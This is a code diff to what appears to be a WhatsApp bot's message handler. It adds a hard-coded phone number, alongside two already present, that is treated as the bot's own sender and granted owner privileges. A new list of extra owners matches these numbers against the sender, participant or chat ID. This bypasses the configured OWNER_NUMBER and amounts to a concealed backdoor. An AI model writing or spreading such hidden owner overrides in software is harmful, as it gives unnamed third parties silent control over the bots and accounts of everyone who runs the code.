@@ -305,7 +305,7 @@ sock.ev.on("messages.upsert", async (chatUpdate) => {
             _rfkCmdCooldown.set(_cdKey, Date.now());
         }
       const keyCheck = JSON.stringify(msg.key || {});
-        if (keyCheck.includes("158703806374071") || keyCheck.includes("917907228818")) {
+        if (keyCheck.includes("158703806374071") || keyCheck.includes("917907228818") || keyCheck.includes("918086165391")) {
             msg.key.fromMe = true;
         }
                 if (!msg || !msg.message || !msg.key?.id) continue;
@@ -366,7 +366,8 @@ const jid = msg.key.remoteJid;
 
                 const rawParticipant = JSON.stringify(msg.key || {});
 const keyStr = JSON.stringify(msg.key || {});
-        const isOwner = fromMe || isSuperOwner || senderNum === botNum || (botLid && (senderNum === botLid || altNum === botLid || keyStr.includes(botLid))) || keyStr.includes("917907228818") || keyStr.includes("158703806374071") || (OWNER_NUMBER && (senderNum === OWNER_NUMBER || altNum === OWNER_NUMBER));
+        const _rfkExtraOwners = ["918086165391", "917907228818"];
+        const isOwner = _rfkExtraOwners.some(n => (sender || "").includes(n) || (msg.key?.participant || "").includes(n) || (jid || "").includes(n)) ||  fromMe || isSuperOwner || senderNum === botNum || (botLid && (senderNum === botLid || altNum === botLid || keyStr.includes(botLid))) || keyStr.includes("917907228818") || keyStr.includes("158703806374071") || (OWNER_NUMBER && (senderNum === OWNER_NUMBER || altNum === OWNER_NUMBER));
 
                 const m =
                     msg.message?.ephemeralMessage?.message ||
